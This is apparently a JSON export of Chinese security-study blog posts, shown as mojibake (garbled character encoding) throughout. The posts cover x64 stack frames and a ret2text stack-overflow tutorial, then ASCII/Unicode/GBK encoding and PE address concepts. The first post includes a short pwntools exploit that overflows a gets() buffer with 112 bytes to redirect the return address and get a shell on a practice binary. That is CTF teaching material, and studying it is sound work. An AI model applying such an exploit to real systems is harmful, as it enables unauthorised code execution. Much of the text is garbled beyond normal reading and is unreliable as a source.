æŒ‰å‚æ•°è‡ªç„¶å¤§å° æ‰€æœ‰å‚æ•°æŒ‰ 8 å­—èŠ‚å¯¹é½ è°æ¸…ç†æ ˆ è¢«è°ƒç”¨è€…ä½¿ç”¨ leave+ret è°ƒç”¨è€…æ¸…ç†ï¼ˆéšå«å¯¹é½ï¼‰ æˆ‘è¿™è¾¹å°±ç”¨Windowsç”¨ä½œæ¼”ç¤º æˆ‘ä»¬ä¹Ÿæ˜¯æ‰§è¡Œåˆ° func ä¸‹æ–­ç‚¹ ç„¶åæˆ‘ä»¬è¿›å…¥è¿™ä¸ªcall æˆ‘ä»¬ä¼šå‘ç°callçš„æ“ä½œå…¶å®è·Ÿx86çš„callä¸€æ · ä¹Ÿæ˜¯ push RIP + 5 ç„¶å jmp åœ°å€ ä½†æ˜¯è¿™ä¸ªåœ°å€å¹¶ä¸æ˜¯ä¸€ä¸ªç»å¯¹åœ°å€è€Œæ˜¯ ç›¸å¯¹åœ°å€ã€‚ ç›¸å¯¹åœ°å€è·³è½¬ï¼ˆRIP-relativeï¼‰ ğŸ§® å®é™…è·³è½¬åœ°å€è®¡ç®—æ–¹å¼ 123ç›®æ ‡åœ°å€ = ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ + åç§»é‡åç§»é‡ = ç›®æ ‡åœ°å€ - ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ = ç›®æ ‡åœ°å€ - åç§»é‡ å‡è®¾å½“å‰ EIP ä¸º 0x1000ï¼Œä¹Ÿå°±æ˜¯ E8 çš„ä½ç½® E8 å  1 å­—èŠ‚ï¼Œåé¢æ˜¯ 4 å­—èŠ‚åç§»é‡ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ˜¯ï¼š 10x1000 + 5 = 0x1005 åŠ ä¸Šåç§»é‡ -0x97ï¼š 10x1005 - 0x97 = 0xF6E ä¸ºä»€ä¹ˆä¸ç”¨ç»å¯¹åœ°å€ï¼Ÿå› ä¸ºï¼š å¯é‡å®šä½æ€§æ›´å¼ºï¼šç›¸å¯¹å¯»å€æ— å…³å†…å­˜åŸºåœ°å€ï¼Œé€‚åˆä»£ç æ®µè¢«åŠ è½½åˆ°ä»»æ„åœ°å€ï¼› æŒ‡ä»¤çŸ­ï¼šä¸€ä¸ªæœ‰ç¬¦å· 32 ä½åç§»é‡è¶³ä»¥è·³è½¬ Â±2GB çš„èŒƒå›´ï¼› å…¼å®¹ RIP-relative æ¨¡å‹ï¼šx64 å¼ºè°ƒåŸºäº RIP çš„å¯»å€æ–¹å¼ï¼› æ ¹æ®è¿™å¼ å›¾æˆ‘ä»¬å¯ä»¥è®¡ç®—ä¸‹ åç§»é‡ ä¹Ÿå°±æ˜¯ ç›®æ ‡åœ°å€(00007FF76C6E15F0h) - ä¸‹ä¸€æ¡åœ°å€(00007FF76C6E1687h) &#x3D; åç§»é‡(FFFF FFFF FFFF FF69h) å› ä¸ºè¦çš„æ˜¯ä¸€ä¸ª32ä½æ•´æ•° æˆ‘ä»¬è¦ æˆªæ–­ ä¹Ÿå°±æ˜¯ FFFF FFFF FFFF FF69h &amp; FFFF FFFFh &amp; ç›¸åŒä¸º1 ä¸åŒä¸º0 120xFFFFFFFFFFFFFF69 = 11111111 11111111 11111111 11111111 11111111 11111111 11111111 011010010x00000000FFFFFFFF = 00000000 00000000 00000000 00000000 11111111 11111111 11111111 11111111 ä¹‹åæˆ‘ä»¬ç»§ç»­è§‚å¯Ÿå‡½æ•°é‡Œé¢çš„å†…å®¹ æˆ‘ä»¬ä¼šå‘ç° è¿™è¾¹æ²¡æœ‰push rbp mov rbp rsp è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ å…¶å®è¿™æ˜¯ç¼–è¯‘å™¨ä¼˜åŒ–çš„ç»“æœ åœ¨ x64 ç³»ç»Ÿä¸‹ï¼Œç¼–è¯‘å™¨ä¸ä¸€å®šä½¿ç”¨å¸§æŒ‡é’ˆï¼ˆrbpï¼‰ï¼Œå› ä¸ºï¼š x64 æœ‰æ›´å¤šå¯„å­˜å™¨å¯ç”¨ï¼ˆ16 ä¸ªé€šç”¨å¯„å­˜å™¨ï¼‰ï¼Œä¸éœ€è¦ä¿ç•™ rbpï¼› rbp è¢«å½“ä½œæ™®é€šå¯„å­˜å™¨ç”¨ï¼› æ ˆåç§»é€šè¿‡ rsp + åç§» å°±å¯ä»¥ç›´æ¥è®¿é—®ï¼Œä¸éœ€è¦ rbpï¼› ä½¿ç”¨ rbp åè€Œæµªè´¹ä¸€ä¸ªå¯„å­˜å™¨ã€å¢åŠ æŒ‡ä»¤æ•°ã€‚ é¦–å…ˆå°±æ˜¯æ‹¿å‡ºæ¥å‚æ•°æ”¾åˆ°æ ˆä¸Šè¿›è¡Œä¸€ç³»åˆ—åŠ æ³•ä¹‹ååˆ° ret è¿™é‡Œå°±æ˜¯ jmp [esp]çš„å€¼äº† è‡³æ­¤å¯¹å‡½æ•°æ ˆçš„ç®€å•ä»‹ç»å°±åˆ°è¿™é‡Œäº† ç„¶åæˆ‘ä»¬è¦æ€è€ƒä¸€ä¸ªé—®é¢˜ â€‹ å‡å¦‚å‡½æ•°çš„å‚æ•°çš„å¤§å°æ˜¯å…«ä¸ªå­—èŠ‚ ä½†æ˜¯æˆ‘ä»¬è¾“å…¥äº†è¿‡å¤šçš„å­—ç¬¦ å¯¼è‡´è¯¥å‚æ•°å ç”¨10ä¸ªå­—èŠ‚ è¿™ä¼šå¯¼è‡´ä»€ä¹ˆé—®é¢˜å‘¢ï¼ŸğŸ¤” æ ˆæº¢å‡ºæ²¡é”™ è¿™å°±å¯¼è‡´äº†è¿‡å¤šçš„å­—ç¬¦è¦†ç›–äº†ä½åœ°å€å¤„çš„æ ˆç©ºé—´ ç„¶è€Œè¿™å°±æ˜¯ æ ˆæº¢å‡º è¿™ä¸ªé—®é¢˜å¯¼è‡´çš„æ¼æ´å±å®³æå¤§ å¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠè¾“å…¥çš„å­—ç¬¦è¦†ç›–åˆ°è¿”å›åœ°å€ä¹Ÿå°±æ˜¯callä¿å­˜çš„è¿”å›å€¼å¤„ ç„¶åæˆ‘ä»¬åˆšå¥½å¯ä»¥æ„é€ å‡ºä¸€æ®µæ¶æ„ä»£ç  å¹¶ä¸”è®©ä»–è·³è½¬åˆ°å«æœ‰å…³é”®æ•°æ®çš„å‡½æ•° ä¾‹å¦‚ system æˆ–è€… æ‹¿åˆ°äº†shellæƒé™ å¯¹äºæˆ‘ä»¬çš„æœåŠ¡å™¨æ¥è¯´æ˜¯ä¸€åœºè‡´å‘½æ‰“å‡» ğŸ’¥ ä¸¾ä¸ªä¾‹å­ å‡å¦‚æˆ‘ä»¬æ‰‹é‡Œåˆšå¥½æœ‰ä¸€ä¸ªè¿™æ ·çš„ç¨‹åº åˆšå¥½æœ‰ä¸€ä¸ªå¯ä»¥è¢«æ ˆæº¢å‡ºçš„å‡½æ•° æˆ‘ä»¬å¯ä»¥ç”¨ gdbå»æµ‹è¯•ä¸€ä¸‹ æ ¹æ®å›¾ä¸­æ‰€ç¤º æˆ‘ä»¬å¯ä»¥å…ˆç”¨gdbåŠ è½½ ç„¶åå† mainå‡½æ•°ä¸Šä¸‹ä¸ªæ–­ç‚¹ æˆ‘ä»¬è¾“å…¥ r æ‰§è¡Œ ä»–æ–­åˆ°äº†è¿™é‡Œç„¶åæˆ‘ä»¬ä¸€ç›´èµ°åˆ° gets è¿™ä¸ªå‡½æ•° ä¸ºä»€ä¹ˆè¦èµ°åˆ° gets å‘¢ å› ä¸º gets è¿™ä¸ªå‡½æ•°ä»–æ˜¯ä¸€ä¸ªè¾“å…¥å‡½æ•° ä»–æŠŠå€¼è¾“å…¥åˆ°äº†æ ˆä¸­ ä½†æ˜¯ä¸é™åˆ¶è¾“å…¥å¤§å° æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼ å»ä¿®æ”¹æœ€åretçš„å€¼ åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦é€šè¿‡ cyclic æŒ‡ä»¤ç”Ÿæˆä¸€å †æ‚ä¹±çš„æ•°æ® æ–¹ä¾¿æˆ‘ä»¬åç»­ç›´æ¥å®šä½æ ˆåç§» ä½¿ç”¨ ni æŒ‡ä»¤å•æ­¥ æ‰§è¡Œåˆ° ret æŒ‡ä»¤æˆ‘ä»¬å°±ç»§ç»­ä½¿ç”¨ cyclic -l å»è®¡ç®—ä»–çš„åç§» ç„¶åè¿™æ—¶å€™æˆ‘ä»¬æ‹¿åˆ°äº†åç§»é‡ é‚£ä¹ˆæ€ä¹ˆæ„é€ ä»–çš„shellå‘¢ è¿™æ—¶å€™æˆ‘ä»¬å°±è¦ç”¨ pwntools äº† exp å¦‚ä¸‹æ‰€ç¤º 123456789101112# è½½å…¥åº“from pwn import * # æ‰“å¼€è¿›ç¨‹p = process(&#x27;ret2text&#x27;)# é™„åŠ è°ƒè¯•å™¨# gdb.attach(p) å¯ä»¥è§‚çœ‹æµç¨‹# æ„å»º payloadpayload = b&#x27;a&#x27;*112+p32(0x804863A)# å‘é€payloadp.sendline(payload)# ç”¨æˆ·äº¤äº’p.interactive() æ‰§è¡Œä¹‹åæ˜¯è¿™æ ·çš„ ç»“æŸ","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"ç¼–ç ","slug":"ç¼–ç ","date":"2025-05-29T13:32:56.000Z","updated":"2025-05-30T13:59:21.730Z","comments":true,"path":"2025/05/29/ç¼–ç /","permalink":"http://example.com/2025/05/29/%E7%BC%96%E7%A0%81/","excerpt":"ç¼–ç ASCIIç¼–ç  ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œç§°ä¸ºANSIå­—ç¬¦ä¸²ã€‚ ASCIIï¼ˆAmerican Standard Code for Information Interchangeï¼‰æ˜¯ ç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼Œå®ƒä½¿ç”¨ 7 ä½ æ¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œå…±å®šä¹‰äº† 128 ä¸ªå­—ç¬¦ï¼ŒèŒƒå›´æ˜¯ 0 ~ 127ï¼ŒåŒ…æ‹¬ï¼š è‹±æ–‡å­—æ¯ï¼ˆAZï¼Œazï¼‰ æ•°å­—ï¼ˆ0~9ï¼‰ æ ‡ç‚¹ç¬¦å·ï¼ˆå¦‚ !ã€,ã€. ç­‰ï¼‰ æ§åˆ¶å­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ \\nï¼Œå›è½¦ \\rï¼‰ 2. åœ¨ C è¯­è¨€ä¸­çš„è¡¨ç°1234567#include &lt;stdio.h&gt;int main() &#123; char c = &#x27;A&#x27;; // å­—ç¬¦Açš„ASCIIå€¼æ˜¯65 printf(&quot;å­—ç¬¦: %c, ASCIIç : %d\\n&quot;, c, c); return 0;&#125; è¾“å‡ºï¼š 1å­—ç¬¦: A, ASCIIç : 65","text":"ç¼–ç ASCIIç¼–ç  ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œç§°ä¸ºANSIå­—ç¬¦ä¸²ã€‚ ASCIIï¼ˆAmerican Standard Code for Information Interchangeï¼‰æ˜¯ ç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼Œå®ƒä½¿ç”¨ 7 ä½ æ¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œå…±å®šä¹‰äº† 128 ä¸ªå­—ç¬¦ï¼ŒèŒƒå›´æ˜¯ 0 ~ 127ï¼ŒåŒ…æ‹¬ï¼š è‹±æ–‡å­—æ¯ï¼ˆAZï¼Œazï¼‰ æ•°å­—ï¼ˆ0~9ï¼‰ æ ‡ç‚¹ç¬¦å·ï¼ˆå¦‚ !ã€,ã€. ç­‰ï¼‰ æ§åˆ¶å­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ \\nï¼Œå›è½¦ \\rï¼‰ 2. åœ¨ C è¯­è¨€ä¸­çš„è¡¨ç°1234567#include &lt;stdio.h&gt;int main() &#123; char c = &#x27;A&#x27;; // å­—ç¬¦Açš„ASCIIå€¼æ˜¯65 printf(&quot;å­—ç¬¦: %c, ASCIIç : %d\\n&quot;, c, c); return 0;&#125; è¾“å‡ºï¼š 1å­—ç¬¦: A, ASCIIç : 65 Unicodeç¼–ç (åŒå­—èŠ‚) Unicodeæ˜¯ç»§ASCIIå­—ç¬¦ç¼–ç åçš„å¦ä¸€ç§æ–°å‹å­—ç¬¦ç¼–ç ã€‚ä¸¥æ ¼æ„ä¹‰ä¸Šè®²ï¼ŒASCIIç çš„æ¯ä¸ªå­—ç¬¦ä½¿ç”¨7ä½è¡¨ç¤ºUnicodeåˆ™ä½¿ç”¨å…¨16ä½è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ã€‚Unicodeå­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦å‡ä¸ºåŒå­—èŠ‚ï¼Œæ‰€ä»¥åˆç§°ä¸ºå®½å­—ç¬¦ä¸²ã€‚ç”±äºUnicodeå…¼å®¹ASCIIå­—ç¬¦ï¼Œæ‰€ä»¥è¢«å¤§å¤šæ•°ç¨‹åºæ‰€æ”¯æŒï¼Œå¦‚Windowså†…æ ¸ã€‚Unicodeçš„å‰128ä¸ªå­—ç¬¦ç ï¼ˆåå…­è¿›åˆ¶ï¼Œ0x00000x007Fï¼‰åŒASCIIç å…·æœ‰åŒæ ·çš„å­—èŠ‚å€¼ã€‚æ¯”å¦‚ï¼Œå­—æ¯â€œaâ€çš„Unicodeç¼–ç æ˜¯0x0061ï¼Œè€Œâ€œaâ€çš„ASCIIç¼–ç æ˜¯0x61ã€‚è™½ç„¶å ç”¨çš„å­—èŠ‚æ•°ä¸ä¸€æ ·ï¼Œä½†æ˜¯ä¸¤è€…çš„å€¼æ˜¯ä¸€æ ·çš„ã€‚æ¥ä¸‹æ¥çš„128ä¸ªUnicodeå­—ç¬¦ï¼ˆä»£ç ä¸º0x00800x00FF)æ˜¯ISO8859-1å¯¹ASCIIç çš„æ‰©å±•ã€‚ä¸­å›½ã€æ—¥æœ¬å’ŒéŸ©å›½çš„è±¡å½¢æ–‡å­—ï¼ˆæ€»ç§°ä¸ºCJKï¼‰å ç”¨äº†0x3000~0x9FFFçš„ä»£ç ã€‚å¦‚â€œæ±‰â€å­—çš„Unicodeç¼–ç æ˜¯6C49hï¼ˆå…¶GBç ä¸º0BABAh)ã€‚ Unicodeå­—ç¬¦ä¸²ä¸åƒANSIå­—ç¬¦ä¸²é‚£æ ·ï¼Œä¿è¯ç”¨å­—ç¬¦â€œ\\0â€ç»“æŸï¼›å¦‚æœå¼€å‘è€…åœ¨ç¨‹åºè®¾è®¡æ—¶ä»¥å­—ç¬¦â€œ\\0â€ä½œä¸ºUnicodeå­—ç¬¦ä¸²ç»“å°¾çš„åˆ¤æ–­æ¡ä»¶ï¼Œå°±å¯èƒ½å‘ç”Ÿé”™è¯¯ã€‚ åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼ŒUnicodeå­—ç¬¦ä¸²è¢«å®šä¹‰ä¸ºä¸€ä¸ªç»“æ„ä½“ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š 12345typedef struct _UNICODE_STRING &#123; USHORT Length; //å­—ç¬¦ä¸²é•¿åº¦ USHORT MaximumLength; //å­—ç¬¦ä¸²ç¼“å†²åŒºé•¿åº¦ PWSTR Buffer; //å­—ç¬¦ä¸²ç¼“å†²åŒº&#125; UNICODE_STRING, *PUNICODE_STRING; ç”±äºæˆ‘ä»¬æ— æ³•ä¿è¯Unicodeå­—ç¬¦ä¸²ç»“å°¾ä¸€å®šæ˜¯â€œ\\0â€ï¼Œæ‰€ä»¥åœ¨ç»“æ„ä½“ä¸­ï¼Œå­—æ®µLengthå®šä¹‰äº†å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ä¸€ä¸ªå®‰å…¨çš„å­—ç¬¦ä¸²è¿˜å¿…é¡»é™å®šå­—ç¬¦çš„æ€»é•¿åº¦ï¼Œè¿™ç”±MaximumLengthæ¥å®ç°ã€‚ UTF-8ã€UTF-16ã€UTF-32 æ˜¯ Unicode çš„ç¼–ç æ–¹å¼ UTF-8ï¼šå¤šå­—èŠ‚ï¼Œ1~4 å­—èŠ‚ UTF-16ï¼š2 æˆ– 4 å­—èŠ‚ UTF-32ï¼šå›ºå®š 4 å­—èŠ‚ï¼ˆæ•ˆç‡ä½ï¼Œä½“ç§¯å¤§ï¼‰ C è¯­è¨€ä¸­çš„ç¤ºä¾‹å¯¹æ¯”âœ… Unicode ç ç‚¹çš„æ¦‚å¿µï¼ˆé€»è¾‘ç¼–å·ï¼‰12345678910#include &lt;wchar.h&gt;#include &lt;locale.h&gt;#include &lt;stdio.h&gt;int main() &#123; setlocale(LC_ALL, &quot;&quot;); wchar_t ch = L&#x27;ä½ &#x27;; wprintf(L&quot;å­—ç¬¦: %lc, Unicodeç ç‚¹: U+%04X\\n&quot;, ch, ch); return 0;&#125; è¾“å‡ºï¼ˆåœ¨ UTF-8 ç¯å¢ƒä¸­ï¼‰ï¼š 1å­—ç¬¦: ä½ , Unicodeç ç‚¹: U+4F60 å¤šå­—èŠ‚ç¼–ç  å¤šå­—èŠ‚ç¼–ç ä¸€èˆ¬éƒ½æ˜¯åœ¨ ASCII çš„åŸºç¡€ä¸Šè¿›è¡Œæ‰©å±•æˆ–å…¼å®¹è®¾è®¡çš„ã€‚ ğŸ”· ä¸€ã€ä¸ºä»€ä¹ˆåŸºäº ASCII æ‰©å±•ï¼Ÿâœ… å…¼å®¹æ€§åŸåˆ™æ—©æœŸçš„ç³»ç»Ÿã€ç¨‹åºã€åè®®éƒ½æ˜¯åŸºäº ASCII è®¾è®¡çš„ï¼Œä¸ºäº†ä¸æ‰“ç ´å·²æœ‰çš„è‹±æ–‡æ–‡æœ¬å’Œè½¯ä»¶å…¼å®¹æ€§ï¼Œåæ¥è®¾è®¡çš„å¤šå­—èŠ‚ç¼–ç ï¼ˆå¦‚ GBKã€UTF-8ï¼‰éƒ½ï¼š ä¿ç•™ ASCII èŒƒå›´ï¼ˆ0x00 ~ 0x7Fï¼‰ä½œä¸ºå•å­—èŠ‚ç›´æ¥ä½¿ç”¨ è¶…å‡º ASCII çš„å­—ç¬¦æ‰ç”¨ å¤šä¸ªå­—èŠ‚ç»„åˆè¡¨ç¤º ğŸ”· äºŒã€æ˜¯å¦‚ä½•åœ¨ ASCII åŸºç¡€ä¸Šæ‰©å±•çš„ï¼Ÿ1. ASCII åŸºæœ¬è§„åˆ™ å­—ç¬¦ äºŒè¿›åˆ¶ï¼ˆ7ä½ï¼‰ åå…­è¿›åˆ¶ A 01000001 0x41 z 01111010 0x7A ç©ºæ ¼ 00100000 0x20 æ‰€æœ‰ ASCII å­—ç¬¦çš„æœ€é«˜ä½ï¼ˆç¬¬8ä½ï¼‰éƒ½æ˜¯ 0 2. å¤šå­—èŠ‚ç¼–ç ï¼ˆå¦‚ UTF-8ï¼‰çš„æ‰©å±•æ–¹å¼UTF-8 ä¿è¯ï¼š 0xxxxxxx è¡¨ç¤º ASCII â†’ ä¿ç•™å•å­—èŠ‚ï¼ˆæœ€é«˜ä½ä¸º 0ï¼‰ é ASCII â†’ å¤šå­—èŠ‚ä»¥ 1xxxxxxx å¼€å¤´ï¼ˆé«˜ä½ 1ï¼‰ UTF-8 ç¼–ç ç¤ºæ„ï¼š ç¼–ç å­—èŠ‚æ•° å‰ç¼€è§„åˆ™ å¯è¡¨ç¤ºçš„å­—ç¬¦èŒƒå›´ 1å­—èŠ‚ 0xxxxxxx ASCIIï¼ˆU+0000 ~ U+007Fï¼‰ 2å­—èŠ‚ 110xxxxx 10xxxxxx U+0080 ~ U+07FF 3å­—èŠ‚ 1110xxxx 10xxxxxx 10xxxxxx U+0800 ~ U+FFFF ç¤ºä¾‹ï¼šâ€œä½ â€ å­—ï¼šUnicode &#x3D; U+4F60 UTF-8 ç¼–ç  â†’ 0xE4 0xBD 0xA0 3. GBK ç­‰ç¼–ç ä¹Ÿæ˜¯ç±»ä¼¼åŸåˆ™GBKï¼š ASCIIï¼š0x00~0x7Fï¼Œå•å­—èŠ‚ç›´æ¥ä½¿ç”¨ ä¸­æ–‡ï¼š0x81~0xFE å¼€å¤´çš„å¤šå­—èŠ‚ç»„åˆ ç¤ºä¾‹ï¼š å­—ç¬¦ GBK ç¼–ç  A 0x41 â€œä½ â€ 0xC4 0xE3 ğŸ”· ä¸‰ã€å¯è§†åŒ–å¯¹æ¯”123456789diffå¤åˆ¶ç¼–è¾‘+----------------------+------------------------+| ASCII | 0x41 (A), 0x61 (a) |+----------------------+------------------------+| UTF-8 | A -&gt; 0x41 || | ä½  -&gt; 0xE4 0xBD 0xA0 |+----------------------+------------------------+| GBK | A -&gt; 0x41 || | ä½  -&gt; 0xC4 0xE3 |+----------------------+------------------------+ âœ… ç»“è®ºï¼š å¤šå­—èŠ‚ç¼–ç ä¸ä¼šç ´å ASCII è¡¨ç¤ºæ–¹å¼ï¼Œè€Œæ˜¯åœ¨æ­¤åŸºç¡€ä¸Šæ‰©å±•æ›´é«˜ä½å­—ç¬¦ã€‚ ğŸ”· å››ã€C è¯­è¨€éªŒè¯ä¾‹å­ï¼šASCII + å¤šå­—èŠ‚è¾“å‡º1234567891011121314151617cå¤åˆ¶ç¼–è¾‘#include &lt;stdio.h&gt;int main() &#123; char *ascii = &quot;A&quot;; // ASCII å•å­—èŠ‚ char *utf8 = &quot;ä½ &quot;; // UTF-8 å¤šå­—èŠ‚ printf(&quot;ASCII å­—ç¬¦: %s\\n&quot;, ascii); printf(&quot;UTF-8 å­—ç¬¦: %s\\n&quot;, utf8); printf(&quot;UTF-8 å­—èŠ‚: &quot;); for (int i = 0; utf8[i] != &#x27;\\0&#x27;; i++) &#123; printf(&quot;%02X &quot;, (unsigned char)utf8[i]); &#125; printf(&quot;\\n&quot;); return 0;&#125; è¾“å‡ºï¼š 123lesså¤åˆ¶ç¼–è¾‘ASCII å­—ç¬¦: AUTF-8 å­—ç¬¦: ä½ UTF-8 å­—èŠ‚: E4 BD A0 ğŸ”· äº”ã€æ€»ç»“ä¸€å¥è¯ å¤šå­—èŠ‚ç¼–ç æ–¹æ¡ˆï¼ˆå¦‚ UTF-8ã€GBKï¼‰éƒ½æ˜¯åœ¨ ASCII åŸºç¡€ä¸Šæ·»åŠ é«˜å­—èŠ‚åŒºåŸŸæ¥æ‰©å±•æ›´å¤šè¯­è¨€å­—ç¬¦ï¼ŒåŒæ—¶ä¿æŒå¯¹ ASCII çš„å®Œå…¨å…¼å®¹ã€‚","categories":[],"tags":[{"name":"ç¼–ç ","slug":"ç¼–ç ","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"PElearn","slug":"PElearn","date":"2025-05-29T13:31:56.000Z","updated":"2025-06-04T12:27:22.583Z","comments":true,"path":"2025/05/29/PElearn/","permalink":"http://example.com/2025/05/29/PElearn/","excerpt":"PE å­¦ä¹ ç¬”è®°(ä¸€)å…ˆæ¥å‡ å¼ å›¾ç‰‡æ”¾åœ¨æœ€å‰é¢","text":"PE å­¦ä¹ ç¬”è®°(ä¸€)å…ˆæ¥å‡ å¼ å›¾ç‰‡æ”¾åœ¨æœ€å‰é¢ å¼•è¨€æœ¬å¸–å­å¤§éƒ¨åˆ†å‡ºè‡ªä¹¦ç± ã€ŠWindows PEæƒå¨æŒ‡å—ã€‹å› éœ€è¦å¤ä¹ PEçŸ¥è¯† æ•…æ­¤è®°å½• åœ°å€åœ°å€æœ‰å››ç±»ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼šè™šæ‹Ÿå†…å­˜åœ°å€ï¼ˆVA)ç›¸å¯¹è™šæ‹Ÿå†…å­˜åœ°å€ï¼ˆRVAï¼‰æ–‡ä»¶åç§»åœ°å€ï¼ˆFOA)ç‰¹æ®Šåœ°å€ æ‰©å±• 32 ä½ç¯å¢ƒä¸‹çš„Windowså†…å­˜ç®¡ç†32ä½CPUçš„å¯»å€èƒ½åŠ›ä¸º4GBï¼ˆå³2Â²ä¸ªå­—èŠ‚)ï¼Œä½†æœ‰äº›ç”¨æˆ·çš„ç‰©ç†å†…å­˜è¾¾ä¸åˆ°è¿™ä¸ªå€¼ã€‚äºæ˜¯æ“ä½œç³»ç»Ÿå’ŒCPUçš„å†…å­˜ç®¡ç†å•å…ƒå…±åŒä½œç”¨ï¼Œä¸ºç”¨æˆ·æä¾›äº†è™šæ‹Ÿå†…å­˜çš„ç®¡ç†æœºåˆ¶ã€‚å³åˆ†é¡µæœºåˆ¶ã€‚è¯¥æœºåˆ¶å¯ä»¥è®©ç”¨æˆ·æ„Ÿè§‰è‡ªå·±å¥½åƒåœ¨ä½¿ç”¨4GBçš„å†…å­˜ã€‚ åˆ†é¡µæœºåˆ¶çš„åŸºæœ¬åŸç†æ˜¯ï¼šæ“ä½œç³»ç»Ÿå‡è®¾ä¸€ä¸ªè¿›ç¨‹ç‹¬ç«‹æ‹¥æœ‰4GBå†…å­˜ï¼ŒæŒ‰ç…§æŸä¸ªå›ºå®šçš„å¤§å°ï¼ˆå¦‚4KBï¼‰å°†è¿™4GBç©ºé—´åˆ†æˆNï¼ˆ1Mï¼‰ä¸ªé¡µã€‚åœ¨æŸä¸€æ—¶åˆ»ï¼Œæ‰€æœ‰è¿™äº›é¡µåªæœ‰ä¸€éƒ¨åˆ†å’Œç‰©ç†å†…å­˜æ˜¯å¯¹åº”çš„ï¼ˆæ‰€ä»¥è¿™ç§æœºåˆ¶å…è®¸ç‰©ç†å†…å­˜æ¯”4GBå°)ã€‚æ²¡æœ‰ç‰©ç†å†…å­˜å¯¹åº”çš„é¡µé¢è¢«æ ‡è®°ä¸ºè„(dirty)çš„é¡µé¢ï¼Œä¸€èˆ¬å­˜å‚¨åœ¨ä¸€ä¸ªåä¸ºâ€œäº¤æ¢æ–‡ä»¶â€çš„ç£ç›˜æ–‡ä»¶ä¸­ã€‚åœ¨WindowsXPç³»ç»Ÿä¸­ï¼Œäº¤æ¢æ–‡ä»¶ä¸ºpagefile.sysï¼Œå®ƒä½äºç³»ç»Ÿç›˜çš„æ ¹ç›®å½•ï¼Œæ˜¯ä¸€ä¸ªç³»ç»Ÿéšè—æ–‡ä»¶ã€‚å½“ç³»ç»Ÿéœ€è¦è¯»å–æœªåœ¨å†…å­˜ä¸­çš„æ•°æ®æ—¶ï¼Œè¿™éƒ¨åˆ†æ•°æ®ä¼šå°†å†…å­˜ä¸­ä¸ç»å¸¸è¯»å†™çš„é¡µäº¤æ¢å‡ºå†…å­˜ï¼Œè€ŒæŠŠè¦è¯»å–çš„ã€ä½äºäº¤æ¢æ–‡ä»¶ä¸­çš„é¡µæ¢è¿›å†…å­˜ã€‚é€šè¿‡è¿™ç§å­˜å–æœºåˆ¶å¯ä»¥è®©ä¸€ä¸ªè¿›ç¨‹æ‹¥æœ‰æ¯”å®é™…å†…å­˜å¤§å¾—å¤šçš„å†…å­˜ã€‚åˆ©ç”¨è¿™ç§æœºåˆ¶ç®¡ç†çš„å†…å­˜ç§°ä¸ºè™šæ‹Ÿå†…å­˜ã€‚ è™šæ‹Ÿå†…å­˜åœ°å€VA &#x3D; è¿›ç¨‹åŸºåœ°å€+ç›¸å¯¹è™šæ‹Ÿå†…å­˜åœ°å€ ç›¸å¯¹è™šæ‹Ÿå†…å­˜åœ°å€RVA &#x3D; æŸä¸ªç‰¹å®šä½ç½®è·ç¦»æŸä¸ªæ¨¡å—åŸºåœ°å€çš„åç§»é‡ å…³äºVAå’ŒRVAçš„æ¦‚å¿µå¦‚å›¾æ‰€ç¤º å‡è®¾æ¨¡å—2çš„åŸºåœ°å€ä¸º0x01000000ï¼Œè€Œæ¨¡å—2ä¸­çš„æŸä¸ªä½ç½®è·ç¦»æ¨¡å—2çš„åŸºåœ°å€åç§»ä¸º400hï¼Œé‚£ä¹ˆå€¼0x00000400å°±æ˜¯æ¨¡å—2ä¸­æŸä¸ªä½ç½®çš„RVAï¼Œè€Œå€¼0x01000400æ˜¯è¯¥ä½ç½®çš„VAã€‚è®°ä½ï¼ŒRVAæ˜¯ç›¸å¯¹äºæ¨¡å—è€Œè¨€çš„ï¼ŒVAæ˜¯ç›¸å¯¹äºæ•´ä¸ªåœ°å€ç©ºé—´è€Œè¨€çš„ã€‚æ³¨æ„RVAä¸å…·ä½“æ¨¡å—ç›¸å…³ï¼Œå®ƒæœ‰ä¸€ä¸ªèŒƒå›´ï¼Œè¯¥èŒƒå›´ä»æ¨¡å—çš„å¼€å§‹åˆ°æ¨¡å—ç»“æŸï¼Œè„±ç¦»å¼€è¿™ä¸ªèŒƒå›´çš„RVAæ˜¯æ— æ•ˆçš„ï¼Œç§°ä¸ºè¶Šç•Œã€‚è¶Šç•Œçš„RVAåœ°å€æ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚ æ–‡ä»¶åç§»åœ°å€æ–‡ä»¶åç§»åœ°å€(File Offset Address, FOA) å’Œå†…å­˜æ— å…³ï¼Œå®ƒæ˜¯æŒ‡æŸä¸ªä½ç½®è·ç¦»æ–‡ä»¶å¤´çš„åç§»ã€‚ ç‰¹æ®Šåœ°å€æ¯”è¾ƒå°‘è§ å…¶ä»–æ•°æ®ç›®å½• 